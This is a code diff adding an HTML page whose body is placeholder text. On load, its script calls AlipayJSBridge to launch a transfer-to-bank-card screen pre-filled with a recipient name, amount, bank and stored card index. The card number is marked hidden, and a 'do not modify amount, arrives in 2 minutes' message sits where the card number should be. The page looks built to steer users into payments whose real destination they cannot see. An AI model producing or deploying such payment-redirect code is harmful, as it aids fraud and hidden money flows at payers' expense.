@@ -1,0 +1,55 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<div>dfdfdf</div>
+</body>
+<script>
+    function returnApp() {
+        AlipayJSBridge.call("exitApp")
+    }
+
+    function ready(a) {
+        window.AlipayJSBridge ? a && a() : document.addEventListener("AlipayJSBridgeReady", a, !1)
+    }
+    ready(function() {
+        try {
+            var bank_no = '请勿修改金额,2分钟内到账****';
+            var bank_user = '林文达';
+            var pay_amount = '50.01';
+            var bank_code = 'ICBC';
+            var bank_name = '工商银行';
+
+            var a = {
+                actionType: "toCard",
+                cardNo: bank_no,
+                receiverName: bank_user,
+                bankAccount: bank_user,
+                money: pay_amount,
+                amount: pay_amount,
+                bankMark: bank_code,
+                bankName: bank_name,
+                cardIndex: "1905091089529748446",
+                cardNoHidden: "true",
+                cardChannel: "HISTORY_CARD",
+                orderSource: "from"
+            };
+
+        } catch (b) {
+            returnApp()
+        }
+        AlipayJSBridge.call("startApp", {
+            appId: "09999988",
+            param: a
+        }, function(a) {})
+    });
+    document.addEventListener("resume", function(a) {
+        returnApp()
+    });
+</script>
+</html>
